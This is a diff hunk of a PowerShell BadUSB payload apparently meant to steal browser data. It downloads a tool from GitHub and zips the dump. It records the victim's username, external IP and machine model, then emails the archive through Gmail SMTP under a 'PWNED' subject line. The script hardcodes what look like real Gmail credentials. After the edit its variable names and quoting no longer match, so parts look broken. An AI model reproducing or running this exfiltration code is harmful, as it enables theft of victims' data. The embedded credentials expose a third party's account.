@@ -10,19 +10,20 @@ Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hac
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
 $ReportEmail = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("beneafrr@gmail.com", "Milo36912!");
-$smtp.EnableSsl = $true
-$ReportEmail.From = "beneafrr@gmail.com"
-$ReportEmail.To.Add("beneafrr@gmail.com")
+$ReportEmail.From = 'beneafrr@gmail.com'
+$ReportEmail.To.Add('beneafrr@gmail.com')
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
-$$ReportEmail.Body = $ComputerName
+$ReportEmail.Body = 'Opening web.'
 $files=Get-ChildItem 
-$ReportEmail.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
-$smtp.Send($ReportEmail)
+$ReportEmail.Attachments.Add('$env:appdata\Microsoft\dump\dump.zip')
+$SMTPInfo.Send($ReportEmail)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
